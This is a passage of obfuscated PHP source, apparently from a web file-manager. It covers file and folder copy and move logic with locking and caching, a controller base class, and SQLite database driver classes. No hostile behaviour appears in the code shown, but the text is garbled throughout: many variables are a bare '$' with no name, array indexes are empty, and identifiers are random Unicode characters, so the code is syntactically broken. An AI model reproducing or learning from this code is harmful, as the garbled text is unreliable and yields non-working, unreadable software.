(CacheLock::lockGet($оּ[596] . $)) { $Û = $this->sourceInfo($݂); CacheLock::setErrorMsg($оּ[163] . htmlspecialchars($Û[$оּ[32]]) . $оּ[165] . $ɣ); $this->_lockKey($, 1); $this->_lockKey($, 0); } } } private function _lockCheckEnd($, $ļ) { $ß =& $_SERVER[]; $镙ظ = $ . $ß[10] . $ļ; CacheLock::setErrorMsg($ß[422]); if (!isset($this->_lockTimeStart[$镙ظ])) { return; } $ = timeFloat() - $this->_lockTimeStart[$镙ظ]; unset($this->_lockTimeStart[$镙ظ]); if ($ > 0.5) { unset(self::$cacheSourceInfo[$ß[501] . $ļ]); } $ = $this->sourceInfo($ļ); if (!$) { show_json(LNG($ß[105]), !1); } } private function _lockParent($۬, $򂅟, $ՠ) { if (!$this->autoLockSet) { return; } $ӕ = $this->sourceInfo($۬); if (!is_array($ӕ)) { return; } $ = array_reverse($this->parentLevelArray($ӕ[$_SERVER[][553]])); foreach ($ as $) { $this->_lockEvent($, $򂅟, $ՠ); } } private function _lockEvent($, $ܛ, $Ö) { $洟 =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($ܛ as $۔) { $Դ = $۔ . $洟[10] . $; if ($Ö && CacheLock::lockGet($洟[596] . $Դ)) { continue; } $this->_lockKey($Դ, $Ö); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ڢ, $û = 1) { $ = $_SERVER[][596] . md5($ڢ); if ($û) { if (isset(self::$_lockItemArr[$])) { return; } self::$_lockItemArr[$] = 1; CacheLock::lock($, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$])) { return; } unset(self::$_lockItemArr[$]); CacheLock::unlock($); } } public function isParentOf($, $) { $޼ =& $_SERVER[]; $޻ُ = $this->sourceInfo($); $ሉ = $this->sourceInfo($); $ = $޻ُ[$޼[553]] . $޻ُ[$޼[181]] . $޼[50]; $݁ = $ሉ[$޼[553]] . $ሉ[$޼[181]] . $޼[50]; $ = strpos($݁, $) === 0; return $; } private $targetIsDelete = 0; public function copy($ݙ, $Ͳ, $ = REPEAT_REPLACE, $ؽ = '') { $ۅ =& $_SERVER[]; $ڽ = $this->sourceInfo($ݙ); $˳ = $this->sourceInfo($Ͳ); if (!$ڽ || !$˳ || $˳[$ۅ[453]] != $ۅ[88]) { return !1; } if ($this->isParentOf($ݙ, $Ͳ)) { return !1; } $˴ = $ؽ ? $ؽ : $ڽ[$ۅ[32]]; $this->lockCopyStart($ݙ); $this->lockWriteStart($Ͳ, $˴); $ = array($ۅ[597] => array(), $ۅ[598] => array(), $ۅ[599] => array()); $this->targetIsDelete = intval($ڽ[$ۅ[473]]); $٠ = $this->fileNameExistAuto($Ͳ, $ڽ); $ç = $this->_copy($ݙ, $Ͳ, $, $, !0, $ؽ); $this->_childrenListClear(); $this->lockCopyEnd($ݙ); $this->lockWriteEnd($Ͳ, $˴); if ($ڽ[$ۅ[453]] == $ۅ[88] && $٠ == $ç) { $this->folderSizeResetChildren($٠); } Model($ۅ[600])->addAll($[$ۅ[598]], array(), !0); if ($٠ != $ç || $ڽ[$ۅ[453]] == $ۅ[88]) { Model($ۅ[601])->eventCopy($ç); } $this->saveAll($[$ۅ[599]]); Model($ۅ[214])->linkAdd($[$ۅ[597]]); $this->folderSizeReset($Ͳ); $this->updateModifyTime($Ͳ); return $ç; } private function _copy($҄, $Ί, $Ȋ, &$޺, $־, $ = '') { $ȝ =& $_SERVER[]; $Ĩ = $this->sourceInfoCache($҄); $ = $Ĩ[$ȝ[453]] == $ȝ[88]; $ = $ ? $ : $Ĩ[$ȝ[32]]; $ط = $this->fileNameExistAuto($Ί, $Ĩ); if ($־) { $this->_childrenAllMake($҄); if ($ && $ط) { $this->_childrenAllMake($ط); } } if (!$ط) { return $this->_copyCreate($҄, $Ί, $, $޺); } $ = $ط; if ($) { if ($Ȋ == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAutoCache($Ί, $, $Ȋ, $); $ = $this->_copyCreate($҄, $Ί, $, $޺); } else { $ = $this->_childrenList($҄); foreach ($ as $ւ) { $this->_copy($ւ[$ȝ[181]], $ط, $Ȋ, $޺, !1); } } } else { if ($Ȋ == REPEAT_RENAME || $Ȋ == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAutoCache($Ί, $, $Ȋ, $); $ = $this->_copyCreate($҄, $Ί, $, $޺); } else { if ($Ȋ == REPEAT_REPLACE) { $ܦ߈ = $this->sourceInfoCache($ط); $ꌀ = $this->fileHistory($ܦ߈, $Ĩ[$ȝ[509]], $Ĩ[$ȝ[76]]); if ($ꌀ) { $޺[$ȝ[597]][] = $Ĩ[$ȝ[509]]; } } else { if ($Ȋ == REPEAT_SKIP) { } } } Hook::trigger($ȝ[602], array($ȝ[603], $Ĩ, 0)); } return $; } private function _copyCreate($Ӿ, $», $̝Юĥ, &$) { $ =& $_SERVER[]; $ = $this->sourceInfoCache($Ӿ); $Ι = $this->sourceInfoCache($»); $ɿ = $this->_makeItemData($, $Ι, $̝Юĥ); Hook::trigger($[604], $ɿ); Hook::trigger($[605], array($[606], $ɿ, 0)); $ = $this->add($ɿ); $É = array($[181] => $, $[32] => $̝Юĥ); $this->_copyApplyMeta($É, $); if ($[$[453]] != $[88]) { $[$[597]][] = $[$[509]]; return $; } $Ϻ = array(); $⾦ = array(); $this->_childrenListAll($Ӿ, $Ϻ); $⻔ن = count($Ϻ); if ($⻔ن == 0) { return $; } $ = $this->sourceInfo($); foreach ($Ϻ as $) { $ = $this->_makeItemData($, $, $[$[32]]); $[$[553]] = $[$[553]]; $⾦[] = $; } $this->chunkEventSet($[607], array($[608], $ɿ, $⻔ن)); $this->addAll($⾦, array(), !1); $ = $this->where(array($[180] => $))->select(); $ਧ = $this->_childrenMakeRelation($Ϻ, $); $ਧ[$Ӿ] = $; $İ = array(); $ = array(); foreach ($ as $) { $܎ = $[$[181]]; $ϱ = $this->_childrenMatch($ਧ, $, $); $İ[] = array($[181], $܎, $[180], $ϱ[$[180]]); $[] = array($[181], $܎, $[553], $ϱ[$[553]]); $this->_copyApplyMeta($, $); if ($[$[453]] != $[88]) { $[$[597]][] = $[$[509]]; } } $this->chunkEventSet($[609], array($[610], $ɿ, $⻔ن)); $this->saveAll($İ); $this->chunkEventSet($[611], array($[612], $ɿ, $⻔ن)); $this->saveAll($); return $; } private function _childrenMakeRelation($ޓ, $) { $㎂ =& $_SERVER[]; $״ = array(); $ۣ = array(); foreach ($ޓ as $ҳ) { $ = $ҳ[$㎂[32]] . $㎂[8] . $ҳ[$㎂[553]]; $״[$] = $ҳ[$㎂[181]]; } foreach ($ as $ҳ) { $ = $ҳ[$㎂[32]] . $㎂[8] . $ҳ[$㎂[553]]; $⏦ = $״[$]; $ۣ[$⏦] = $ҳ[$㎂[181]]; } return $ۣ; } private function _childrenMatch($٬킭, $ʅ, $) { $̔ =& $_SERVER[]; $ = $[$̔[553]]; $ = $this->parentLevelArray($ʅ[$̔[553]]); foreach ($ as $©) { if (isset($٬킭[$©])) { $ .= $٬킭[$©] . $̔[613]; } } $ = rtrim($, $̔[50]) . $̔[50]; $ = $this->parentLevelArray($); $Ʋ = $[count($) - 1]; return array($̔[180] => $Ʋ, $̔[553] => $); } private function _makeItemData($, $۬Ρ, $) { $ﳴ =& $_SERVER[]; $ = array($ﳴ[614] => $[$ﳴ[453]], $ﳴ[462] => $, $ﳴ[615] => $[$ﳴ[454]] ? $[$ﳴ[454]] : $ﳴ[12], $ﳴ[510] => $[$ﳴ[509]] ? $[$ﳴ[509]] : 0, $ﳴ[585] => $[$ﳴ[76]] ? $[$ﳴ[76]] : 0, $ﳴ[616] => intval($۬Ρ[$ﳴ[178]]), $ﳴ[617] => intval($۬Ρ[$ﳴ[538]]), $ﳴ[618] => intval(USER_ID), $ﳴ[619] => intval(USER_ID), $ﳴ[445] => intval($۬Ρ[$ﳴ[181]]), $ﳴ[620] => $۬Ρ[$ﳴ[553]] . $۬Ρ[$ﳴ[181]] . $ﳴ[50], $ﳴ[466] => $[$ﳴ[85]] ? $[$ﳴ[85]] : time(), $ﳴ[472] => 0, $ﳴ[621] => $ﳴ[12]); return $; } private function _copyApplyMeta($, &$ا狌) { $۪ =& $_SERVER[]; $۹ = $[$۪[181]]; $ = $[$۪[32]]; if (!isset($[$۪[622]]) || !$[$۪[622]] || $[$۪[622]] == $۪[212]) { $ا狌[$۪[599]][] = array($۪[181], $۹, $۪[622], short_id($۹)); } if (Input::check($, $۪[623])) { $ا狌[$۪[598]][] = array($۪[181] => $۹, $۪[94] => $۪[506], $۪[418] => str_replace($۪[53], $۪[12], Pinyin::get($))); $ا狌[$۪[598]][] = array($۪[181] => $۹, $۪[94] => $۪[505], $۪[418] => Pinyin::get($, $۪[624])); } $ا狌[$۪[598]][] = array($۪[181] => $۹, $۪[94] => $۪[485], $۪[418] => KodSort::makeStr($)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($׫) { $Чŕ =& $_SERVER[]; $ӭ = $this->sourceInfo($׫); $Ũ = $Чŕ[625]; $ե = array($Чŕ[553] => array($Чŕ[580], $ӭ[$Чŕ[553]] . $׫ . $Чŕ[581]), $Чŕ[473] => $this->targetIsDelete); $ = $this->field($Ũ)->where($ե)->select(); if (!$) { return; } $ = array_to_keyvalue($, $Чŕ[181]); foreach ($ as $Ǥ) { $ = $Ǥ[$Чŕ[180]]; $׫ = $Ǥ[$Чŕ[181]]; if (!isset($this->_childrenListCache[$׫]) && $Ǥ[$Чŕ[453]] == $Чŕ[88]) { $this->_childrenListCache[$׫] = array(); } if (!isset($this->_childrenListCache[$])) { $this->_childrenListCache[$] = array(); } $this->_childrenListCache[$][$׫] = $Ǥ; $this->_childrenItemCache[$׫] = $Ǥ; } } private function _childrenListAll($, &$ٽ) { $ =& $_SERVER[]; if (!isset($this->_childrenListCache[$])) { return; } $ո = $this->_childrenListCache[$]; foreach ($ո as $֡ => $) { $ٽ[$֡] = $; if ($[$[453]] == $[88]) { $this->_childrenListAll($֡, $ٽ); } } } private function sourceInfoCache($󆠐) { if (isset($this->_childrenItemCache[$󆠐])) { return $this->_childrenItemCache[$󆠐]; } return $this->sourceInfo($󆠐); } private function _childrenList($˅) { if (isset($this->_childrenListCache[$˅])) { return $this->_childrenListCache[$˅]; } return $this->_childrenListSelect($˅); } private function _childrenListSelect($ʳ) { $ =& $_SERVER[]; $ļ = array($[180] => $ʳ, $[473] => $this->targetIsDelete); $৻ = $this->where($ļ)->select(); $৻ = $৻ ? $৻ : array(); $ = array_to_keyvalue($৻, $[181]); $this->_childrenListCache[$ʳ] = $; foreach ($ as $ʳ => $) { $this->_childrenItemCache[$ʳ] = $; } return $; } private function fileNameExistAuto($ޚ, $٥) { $ݴ =& $_SERVER[]; if ($٥[$ݴ[473]] == $ݴ[88]) { return $this->fileNameExist($ޚ, $٥[$ݴ[32]]); } return $this->fileNameExistCache($ޚ, $٥[$ݴ[32]]); } private function fileNameExistCache($ߞ, $ß) { $ɸ =& $_SERVER[]; $ß = strtolower($ß); $ް = $this->_childrenList($ߞ); foreach ($ް as $) { if ($ß == strtolower($[$ɸ[32]])) { return $[$ɸ[181]]; } } return !1; } private function fileNameAutoCache($, $ѻ, $Ъ, $ɂ) { $ =& $_SERVER[]; $ߖ = $this->_childrenList($); $ުĢ = array_to_keyvalue($ߖ, $[12], $[32]); return $this->fileNameAutoGet($ުĢ, $ѻ, $Ъ, $ɂ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ձ, $, $߇ӯ = REPEAT_REPLACE, $ = '') { $ߛ =& $_SERVER[]; $ǐ = $this->sourceInfo($ձ); $ϲ = $this->sourceInfo($); if ($ǐ[$ߛ[180]] == $ϲ[$ߛ[181]]) { if ($ǐ[$ߛ[473]] == $ߛ[88]) { Model($ߛ[471])->restore(array($ձ)); } if (!$ || $ == $ǐ[$ߛ[32]]) { return $ձ; } } $󡊝 = $this->pathInfoMore($ձ); if ($this->isParentOf($ձ, $)) { return !1; } if (!$ǐ || !$ϲ || $ϲ[$ߛ[453]] != $ߛ[88]) { return !1; } Hook::trigger($ߛ[626], $󡊝); $this->targetIsDelete = intval($ǐ[$ߛ[473]]); if ($ǐ[$ߛ[180]] == $ && $ != $ǐ[$ߛ[32]]) { $ = $this->fileNameExist($, $); if ($ && $ǐ[$ߛ[453]] == $ߛ[212]) { $ގГ = $this->sourceInfo($); $ = $this->fileHistory($ގГ, $ǐ[$ߛ[509]], $ǐ[$ߛ[76]]); if (!$) { Model($ߛ[512])->remove($ǐ[$ߛ[509]]); } $this->removeNow($ձ, !1); $this->folderSizeReset($); Hook::trigger($ߛ[627], $󡊝); return $; } } $ = $ ? $ : $ǐ[$ߛ[32]]; $this->lockMoveStart($ձ); $this->lockWriteStart($, $); $ = array($ߛ[597] => array(), $ߛ[628] => !1); $this->clearShare($ձ, $); $˨é = $this->fileNameExistAuto($, $ǐ); $˩ = $this->_move($ձ, $, $߇ӯ, $, $); $this->sourceCacheClear(); if ($ǐ[$ߛ[453]] == $ߛ[88] && $˨é) { $this->folderSizeResetChildren($˩); } Model($ߛ[214])->linkAdd($[$ߛ[597]]); if ($˨é && $[$ߛ[628]]) { $this->removeNow($ձ, !1); } $this->lockMoveEnd($ձ); $this->lockWriteEnd($, $); $this->folderSizeReset($ǐ[$ߛ[180]]); $this->folderSizeReset($); $ˈ = array($ǐ[$ߛ[180]], $); if ($ǐ[$ߛ[453]] == $ߛ[88]) { $ˈ[] = $ձ; } $this->updateModifyTime($ˈ); Model($ߛ[601])->eventMove($ձ, $ǐ[$ߛ[180]], $); Hook::trigger($ߛ[627], $󡊝); return $˩; } private function _move($׍, $׃, $, &$ܾ, $ݛƵ = '') { $ܢ =& $_SERVER[]; $ = $this->sourceInfo($׍); $Ť = $[$ܢ[453]] == $ܢ[88]; $Ԥ = $ݛƵ ? $ݛƵ : $[$ܢ[32]]; $Ӆ = $this->fileNameExistAuto($׃, $); $this->lockMoveStart($׍); $this->lockWriteStart($׃, $Ԥ); if (!$Ӆ) { return $this->_moveForce($׍, $׃, $Ԥ); } $՜ = $Ӆ; $ = !1; if ($Ť) { if ($ == REPEAT_RENAME_FOLDER) { $Ԥ = $this->fileNameAuto($׃, $Ԥ, $, $Ť); $՜ = $this->_moveForce($׍, $׃, $Ԥ); } else { if ($ == REPEAT_RENAME_FOLDER) { $ = REPEAT_RENAME; } $ = $this->_childrenListSelect($׍); foreach ($ as $) { $this->_move($[$ܢ[181]], $Ӆ, $, $ܾ); } $ = !0; } } else { if ($ == REPEAT_SKIP) { $ = !0; } else { if ($ == REPEAT_RENAME || $ == REPEAT_RENAME_FOLDER) { $Ԥ = $this->fileNameAuto($׃, $Ԥ, $, $Ť); $՜ = $this->_moveForce($׍, $׃, $Ԥ); } else { if ($ == REPEAT_REPLACE) { $ = $this->sourceInfoCache($Ӆ); $ = $this->fileHistory($, $[$ܢ[509]], $[$ܢ[76]]); $ = !0; if ($) { $ܾ[$ܢ[597]][] = $[$ܢ[509]]; } } } } } if ($ && !$ܾ[$ܢ[628]]) { $ܾ[$ܢ[628]] = !0; } return $՜; } private function _moveForce($, $, $ˇ) { $ =& $_SERVER[]; $秕 = $this->sourceInfo($); $΅Ј = $this->sourceInfo($); $ = $秕[$[453]] == $[88]; $Íߗ = array($[445] => $΅Ј[$[181]], $[620] => $΅Ј[$[553]] . $΅Ј[$[181]] . $[50], $[616] => $΅Ј[$[178]], $[617] => $΅Ј[$[538]], $[619] => USER_ID, $[462] => $ˇ); $봖 = $秕[$[178]] == SourceModel::TYPE_GROUP && $΅Ј[$[178]] == SourceModel::TYPE_GROUP && $秕[$[538]] == $΅Ј[$[538]]; if (!$봖 && $this->moveClearAuth) { Model($[535])->authClear($); } $ = $秕[$[473]] == $[88] && $΅Ј[$[473]] != $[88]; if ($) { $Íߗ[$[472]] = 0; } if ($) { $Ц = array($[620] => array($[580], $秕[$[553]] . $秕[$[181]] . $[581])); $ = $秕[$[553]] . $秕[$[181]] . $[50]; $򶰠 = $΅Ј[$[553]] . $΅Ј[$[181]] . $[50] . $秕[$[181]] . $[50]; $ɽ = array($[620] => array($[629], "\162\x65\160\154\141\x63\145\x28\x70\141\162\145\156\164\x4c\145\166\x65\x6c\54\47{$}\47\x2c\x27{$򶰠}\x27\x29"), $[616] => $΅Ј[$[178]], $[617] => $΅Ј[$[538]]); if ($) { $ɽ[$[472]] = 0; } $this->where($Ц)->data($ɽ)->save(); } $this->where(array($[459] => $))->data($Íߗ)->save(); return $; } private function clearShare($ù, $֬) { $Оـ =& $_SERVER[]; $稛 = $this->sourceInfo($ù); $̀Ĉ = $this->sourceInfo($֬); if ($稛[$Оـ[538]] == $̀Ĉ[$Оـ[538]] && $稛[$Оـ[178]] == $Оـ[630]) { return; } $ = array($Оـ[553] => array($Оـ[580], $稛[$Оـ[553]] . $ù . $Оـ[581])); $ = $this->field($Оـ[459])->where($)->getField($Оـ[181], !0); if (!$) { return; } $ = array($Оـ[181] => array($Оـ[7], $), $Оـ[631] => 1); $Ԯ = Model($Оـ[632])->field($Оـ[633])->where($)->select(); if (!$Ԯ) { return; } $Ԯ = array_to_keyvalue($Ԯ, $Оـ[12], $Оـ[633]); $ = array($Оـ[633] => array($Оـ[7], $Ԯ)); Model($Оـ[632])->where($)->save(array($Оـ[631] => 0)); Model($Оـ[634])->where($)->delete(); } public function copyFolderFromIO($㪘, $ᎇύ, $ꔀ, $, $ˇ, $ = false) { $ =& $_SERVER[]; $۶ = array($[598] => array(), $[599] => array(), $[597] => array(), $[635] => array()); $̏ = $ ? $ : $㪘->pathThis($ᎇύ); $ٜ = $this->fileNameExist($ꔀ, $̏); $ۮ = $this->mkdir($ꔀ, $̏, $); if (!$ٜ || $ == REPEAT_RENAME_FOLDER) { $ = !1; } if ($ٜ) { $this->_childrenAllMake($ٜ); } Hook::trigger($[636]); $this->_copyChildTo($㪘, $ᎇύ, $ۮ, $, $۶, $ˇ); Hook::trigger($[637]); if ($ۮ) { $this->folderSizeResetChildren($ۮ); } $this->_childrenListClear(); Model($[600])->addAll($۶[$[598]], array(), !0); Model($[601])->eventCopy($ۮ); $this->saveAll($۶[$[599]]); Model($[512])->linkAdd($۶[$[597]]); Model($[512])->remove($۶[$[635]]); $this->folderSizeReset($ꔀ); $this->updateModifyTime($ꔀ); return $ۮ; } private function _copyChildTo($ǀ, $䉀, $֮Ʌ, $짯, &$, $) { $ͳ =& $_SERVER[]; $ = $this->sourceInfoCache($֮Ʌ); $򦍕 = $ǀ->listPath($䉀); $򦍕 = $򦍕 ? $򦍕 : array($ͳ[83] => array(), $ͳ[82] => array()); $÷ = array_merge($򦍕[$ͳ[83]], $򦍕[$ͳ[82]]); $֛ = $this->_addFiles($ǀ, $򦍕[$ͳ[83]], $); $ = array(); foreach ($÷ as &$䃠) { if (isset($֛[$䃠[$ͳ[32]]])) { $䃠 = $֛[$䃠[$ͳ[32]]]; } $䃠[$ͳ[453]] = $䃠[$ͳ[33]] == $ͳ[75]; $䃠[$ͳ[454]] = substr(_get($䃠, $ͳ[175], $ͳ[12]), 0, 10); $䃠[$ͳ[76]] = _get($䃠, $ͳ[76], 0); $䃠[$ͳ[509]] = _get($䃠, $ͳ[509], 0); if (!isset($䃠[$ͳ[638]]) && $䃠[$ͳ[509]]) { $[$ͳ[635]][] = $䃠[$ͳ[509]]; } if ($짯) { $֥Ϊ = $this->fileNameExistCache($֮Ʌ, $䃠[$ͳ[32]]); if ($֥Ϊ) { if ($䃠[$ͳ[453]] || $짯 == REPEAT_SKIP) { continue; } if ($짯 == REPEAT_REPLACE) { $ = $this->sourceInfoCache($֥Ϊ); $Ǵƽ = $this->fileHistory($, $䃠[$ͳ[509]], $䃠[$ͳ[76]]); if ($Ǵƽ) { $[$ͳ[597]][] = $䃠[$ͳ[509]]; } continue; } else { if ($짯 == REPEAT_RENAME) { $䃠[$ͳ[32]] = $this->fileNameAutoCache($֮Ʌ, $䃠[$ͳ[32]], $짯, !1); } } } } if (!$䃠[$ͳ[453]] && $䃠[$ͳ[509]] == 0) { continue; } if (!$䃠[$ͳ[453]] && $䃠[$ͳ[509]]) { $[$ͳ[597]][] = $䃠[$ͳ[509]]; } $[] = $this->_makeItemData($䃠, $, $䃠[$ͳ[32]]); } unset($䃠); if (!empty($)) { $this->addAll($); $this->_childrenListSelect($֮Ʌ); } $生 = $this->_childrenList($֮Ʌ); $生 = array_to_keyvalue($生, $ͳ[32]); foreach ($÷ as $䃠) { $ = $生[$䃠[$ͳ[32]]]; $ = $[$ͳ[181]]; $this->_copyApplyMeta($, $); if ($䃠[$ͳ[33]] == $ͳ[75]) { $䃠[$ͳ[84]] = $ǀ->getPathInner($䃠[$ͳ[84]]); $this->_copyChildTo($ǀ, $䃠[$ͳ[84]], $, $짯, $, $); } } } private function _addFiles($ԃ, $, $ƾ) { $ =& $_SERVER[]; if (!$ || count($) == 0) { return array(); } $ᅜ = array(); foreach ($ as &$ڄ) { Hook::trigger($[639], $ڄ); $ڄ[$[84]] = $ԃ->getPathInner($ڄ[$[84]]); $ӯՃ = $ԃ->hashSimple($ڄ[$[84]]); $ޟ = $ԃ->hashMd5($ڄ[$[84]]); if (strlen($ޟ) > 10 && !isset($ᅜ[$ޟ])) { $ᅜ[$ޟ] = array(); } $ڄ[$[640]] = $ӯՃ; $ڄ[$[641]] = $ޟ; $ᅜ[$ޟ][] =& $ڄ; if (count($ᅜ[$ޟ]) > 1) { $ڄ[$[638]] = !0; } Hook::trigger($[642], $ڄ); } unset($ڄ); $ = array($[641] => array($[7], array_keys($ᅜ))); $ۋ = Model($[643]); $ = $ۋ->where($)->select(); $ = $ ? $ : array(); foreach ($ as $) { if (!isset($ᅜ[$[$[641]]])) { continue; } $闙ę = $ᅜ[$[$[641]]]; foreach ($闙ę as &$ڄ) { $ڄ[$[509]] = $[$[509]]; $ڄ[$[638]] = !0; } unset($ڄ); } $㵘 = array(); foreach ($ as $ъ) { Hook::trigger($[644], $ъ); if (isset($ъ[$[638]]) && $ъ[$[638]]) { Hook::trigger($[645], $ъ); continue; } $ = $ԃ->getPathInner($ъ[$[84]]); $ = $ۋ->addFileMake($, $ъ[$[76]], $ъ[$[640]], $ъ[$[641]], $ъ[$[32]], $ƾ); Hook::trigger($[645], $ъ); if (!is_array($)) { continue; } $㵘[] = $; } $ۋ->addAll($㵘); $ = array($[641] => array($[7], array_keys($ᅜ))); $ = $ۋ->where($)->select(); $ = $ ? $ : array(); foreach ($ as $) { if (!isset($ᅜ[$[$[641]]])) { continue; } $ =& $ᅜ[$[$[641]]]; foreach ($ as &$ڄ) { $ڄ[$[509]] = $[$[509]]; } unset($ڄ); } $ = array(); foreach ($ as $μۊ) { $[$μۊ[$[32]]] = $μۊ; } return $; } } goto a; Dǭ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ꜛ =& $_SERVER[]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ꜛ[6]] =& $config; $this->values[$ꜛ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ꜛ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($) { if (1 === func_num_args()) { $this->{$} = new $(); } else { $ = new ReflectionClass($); $ԇ = func_get_args(); array_shift($ԇ); $this->{$} = $->newInstanceArgs($ԇ); } return $this->{$}; } public function routeBind($Ϩ, $, $ = 3) { $ =& $_SERVER[]; $֒ = $this->in[$[9]]; $Ϩ = str_replace($[10], $[11], trim(trim($Ϩ, $[8]), $[12])); if (!$Ϩ || count($֒) <= $) { return !1; } $ = !0; $ = explode($[8], $Ϩ); for ($ߝ = 0; $ߝ < count($); $ߝ++) { if ($[$ߝ] != $֒[$ + $ߝ]) { $ = !1; break; } } if (!$) { return; } call_user_func_array(array($this, $), array()); } public function routeArgs($տ׺ = 3) { $ = $this->in[$_SERVER[][9]]; if (count($) <= $տ׺) { return array(); } $Ѻ = array(); for ($ה = $տ׺; $ה < count($); $ה += 2) { $Ѻ[$[$ה]] = $[$ה + 1]; $this->in[$[$ה]] = $[$ה + 1]; } return $Ѻ; } protected function assign($, $) { $this->values[$] = $; } protected function display($) { ob_end_clean(); extract($this->values); require $this->tpl . $; } } class DbSqliteBase extends Db { public function __construct($۱ = '') { $ע̏ =& $_SERVER[]; if (!extension_loaded($ע̏[13])) { think_exception(think_lang($ע̏[14]) . $ע̏[15]); } if (!empty($۱)) { if (!isset($۱[$ע̏[16]])) { $۱[$ע̏[16]] = 438; } $this->config = $۱; if (empty($this->config[$ע̏[17]])) { $this->config[$ע̏[17]] = array(); } } } public function connect($۪ۇ = '', $Χ = 0) { $ܽ =& $_SERVER[]; if (!isset($this->linkID[$Χ])) { if (empty($۪ۇ)) { $۪ۇ = $this->config; } $؍ = !empty($۪ۇ[$ܽ[17]][$ܽ[18]]) ? $۪ۇ[$ܽ[17]][$ܽ[18]] : $this->pconnect; $ = $؍ ? $ܽ[19] : $ܽ[20]; $this->linkID[$Χ] = $($۪ۇ[$ܽ[21]], $۪ۇ[$ܽ[16]]); if (!$this->linkID[$Χ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Χ], 30000); if (1 != think_config($ܽ[22])) { unset($this->config); } } return $this->linkID[$Χ]; } public function free() { $this->queryID = null; } public function query($ʜ) { $ﳥ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ʜ; if ($this->queryID) { $this->free(); } think_action_status($ﳥ[23], 1); think_status($ﳥ[24]); $this->queryID = sqlite_query($this->_linkID, $ʜ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ = $this->getAll(); return $; } } public function execute($) { $ỡ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($ỡ[25], 1); think_status($ỡ[24]); $ = sqlite_exec($this->_linkID, $); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = sqlite_query($this->_linkID, $_SERVER[][27]); if (!$) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $̉¬ = sqlite_query($this->_linkID, $_SERVER[][28]); if (!$̉¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Հ = array(); if ($this->numRows > 0) { for ($⶯ = 0; $⶯ < $this->numRows; $⶯++) { $Հ[$⶯] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Հ; } public function getFields($虏ѕ) { $徖 =& $_SERVER[]; $ӗ = $this->query($徖[29] . $虏ѕ . $徖[30]); $ = array(); if ($ӗ) { foreach ($ӗ as $Ҝ̪ => $) { $[$[$徖[31]]] = array($徖[32] => $[$徖[31]], $徖[33] => $[$徖[34]], $徖[35] => (bool) ($[$徖[36]] === $徖[12]), $徖[37] => $[$徖[38]], $徖[39] => strtolower($[$徖[40]]) == $徖[41], $徖[42] => strtolower($[$徖[43]]) == $徖[44]); } } return $; } public function getTables($ = '') { $˽ =& $_SERVER[]; $޳ = $this->query($˽[45] . $˽[46] . $˽[47]); $Ǩ = array(); foreach ($޳ as $ => $) { $Ǩ[$] = current($); } return $Ǩ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ =& $_SERVER[]; $ΐϱ = sqlite_last_error($this->_linkID); $this->error = $ΐϱ . $[4] . sqlite_error_string($ΐϱ); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($̲) { return sqlite_escape_string($̲); } public function parseLimit($) { $ =& $_SERVER[]; $ = $[12]; if (!empty($)) { $ = explode($[50], $); if (count($) > 1) { $ .= $[51] . $[1] . $[52] . $[0] . $[53]; } else { $ .= $[51] . $[0] . $[53]; } } return $; } } class DbSqlite3Base extends Db { public function __construct($ = '') { $ؑ =& $_SERVER[]; if (!class_exists($ؑ[54])) { think_exception(think_lang($ؑ[14]) . $ؑ[55]); } if (!empty($)) { if (!isset($[$ؑ[16]])) { $[$ؑ[16]] = 438; } $this->config = $; if (empty($this->config[$ؑ[17]])) { $this->config[$ؑ[17]] = array(); } } } public function connect($ٱ = '', $ͤ = 0) { $Ԃ =& $_SERVER[]; if (!isset($this->linkID[$ͤ])) { if (empty($ٱ)) { $ٱ = $this->config; } $this->linkID[$ͤ] = new SQLite3($ٱ[$Ԃ[21]]); if (!$this->linkID[$ͤ]) { think_exception($this->linkID[$ͤ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ͤ]->busyTimeout(30000); if (1 != think_config($Ԃ[22])) { unset($this->config); } } return $this->linkID[$ͤ]; } public function free() { $this->queryID = null; } public function query($̏) { $ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $̏; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = $this->_linkID->query($̏); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ӢŊ = $this->getAll(); $this->numRows = count($ӢŊ); return $ӢŊ; } } public function execute($ݡ) { $󦟬 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; 